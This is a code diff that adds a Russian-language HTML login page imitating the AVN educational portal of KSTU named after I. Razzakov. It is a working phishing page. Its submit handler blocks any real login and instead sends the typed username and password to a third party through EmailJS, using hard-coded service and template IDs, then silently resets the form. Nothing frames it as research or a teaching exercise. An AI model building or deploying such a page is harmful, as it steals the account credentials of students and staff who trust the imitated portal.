@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация | Oбразовательный портал AVN</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+      (function() {
+        emailjs.init("cx5V72evbupTwOzLB"); // Замени YOUR_USER_ID на ID пользователя из EmailJS
+      })();
+    </script>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #4967a3;
+        }
+        img {
+            width: 10%;
+            aspect-ratio: auto 511/489;
+            height: 20%;
+        }
+        h1 {
+          font-family: 'Roboto', sans-serif;
+          font-weight: bold;
+          font-size: 20px;
+          margin: 10px 0;
+          color: white;
+        }
+        p {
+          font-family: Helvetica, sans-serif;
+          font-style: normal;
+          color: white;
+          font-weight: 600;
+          font-size: 24px;
+          text-shadow: 1px 1px 2px black, 0 0 1em #797777;
+        }
+        .formWrapper {
+            background: #f1f5fc;
+            border-radius: 4px;
+            color: black;
+            margin: 0 auto;
+            padding: 20px;
+            border: 2px solid #ccc;
+            box-sizing: border-box;
+            box-shadow: -1px 4px 10px 5px #00000082;
+            width: 460px;
+        }
+        .loginFormHeading {
+            font-size: 28px;
+            font-weight: 400;
+            text-shadow: none;
+            font-family: Helvetica, sans-serif;
+            font-size: 28px;
+            color: #787171;
+            font-weight: lighter;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .formField {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .form__input {
+            width: 100%;
+            color: #090909;
+            border-radius: 10px;
+            padding: 8px 0px 5px 20px;
+            font-family: Helvetica, Arial, sans-serif;
+            font-style: normal;
+            font-weight: normal;
+            border: 1px solid #b1a2a24d;
+            background: #fff;
+            font-size: 16px;
+            line-height: 26px;
+            box-sizing: border-box;
+        }
+        .eyeIcon {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+        .form__error {
+            font-size: 12px;
+            color: red;
+            display: block;
+            margin-top: 5px;
+        }
+        .google_box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .google_box svg {
+            margin-right: 10px;
+        }
+        .loginSubmit {
+            width: 100%;
+            padding: 10px;
+            background-color: #4967a3;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .loginSubmit:hover {
+            background-color: #36508b;
+        }
+        .loginSubmit i {
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <img src="img/university.png" alt="Картинка" />
+    <h1>КГТУ им. И. Раззакова</h1>
+    <p>Oбразовательный портал AVN</p>
+
+    <div class="formWrapper">
+        <form id="loginForm">
+            <p class="loginFormHeading">Авторизация</p>
+            
+            <!-- Поле логина -->
+            <div class="formField">
+                <input name="login" placeholder="Пользователь" class="form__input" type="text" required="">
+            </div>
+            
+            <!-- Поле пароля -->
+            <div class="formField">
+                <input name="password" placeholder="Пароль" id="password" type="password" required="" class="form__input" minlength="3">
+            </div>
+            
+            <!-- Кнопка отправки -->
+            <button class="loginSubmit" type="submit">
+                Войти
+            </button>
+        </form>
+    </div>
+    <div id="loadingIndicator" style="display: none;">Отправка данных...</div>
+
+
+ 
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Останавливаем стандартную отправку формы
+
+        // Показать индикатор загрузки
+        document.getElementById('loadingIndicator').style.display = 'block';
+
+        // Отправка данных через EmailJS
+        emailjs.sendForm('service_x2zp7sb', 'template_8671sid', this)
+            .then(function() {
+                // Скрыть индикатор загрузки после успешной отправки
+                document.getElementById('loadingIndicator').style.display = 'none';
+                // Очистить форму после отправки
+                document.getElementById('loginForm').reset();
+            }, function(error) {
+                // Скрыть индикатор загрузки при ошибке
+                document.getElementById('loadingIndicator').style.display = 'none';
+                alert('Ошибка при отправке данных: ' + JSON.stringify(error));
+            });
+    });
+</script>
+
+</body>
+</html>
